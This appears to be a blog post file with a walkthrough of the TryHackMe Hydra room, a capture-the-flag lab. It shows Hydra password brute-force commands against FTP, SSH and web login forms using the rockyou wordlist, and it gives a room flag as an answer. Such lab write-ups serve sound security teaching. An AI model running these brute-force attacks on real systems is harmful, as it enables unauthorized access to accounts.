export default {
    ...
    category: 'TryHackMe',
    difficulty: 'Easy',
    tags: ['Penetration Testing', 'Hydra'],
    date: '2026-02-04T12:00:00',
    excerpt: 'Write up and walkthrough of Hydra room on TryHackMe.',
    content: `
This is a write up and walkthrough of the Hydra room on TryHackMe.
...
Press the green Start Machine button below to deploy the machine attached to this task, then navigate to http://10.66.184.194 on the AttackBox (this machine can take up to 3 minutes to boot)

**Hydra Commands**
The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being \`user\` and a password list being \`passlist.txt\`, we’d use the following command:

\`hydra -l user -P passlist.txt ftp://10.66.184.194\`
...
For example, \`hydra -l root -P passwords.txt 10.66.184.194 -t 4 ssh\` will run with the following arguments:
...
\`sudo hydra <username> <wordlist> 10.66.184.194 http-post-form "<path>:<login_credentials>:<invalid_response>"\`
...
\`hydra -l <username> -P <wordlist> 10.66.184.194 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V\`
...
\`hydra -l <username> -P <wordlist> 10.66.184.194 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V\`
...
**Reason:**
1. Run \`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.184.194 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V\`
2. Copy the password from the output and use it to log in to the web page.

Use Hydra to bruteforce molly's SSH password. What is flag 2?
**Answer:** THM{c8eeb0468febbadea859baeb33b2541b}
**Reason:**
1. Run \`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.184.194 ssh -v -t 4 -s 22 ssh\`
2. Run \`ssh molly@10.66.184.194\` and enter the password from the output of the previous command.
3. Run \`ls\` to list all files and directories.
4. Run \`cat flag2.txt\` to read the flag.
`
}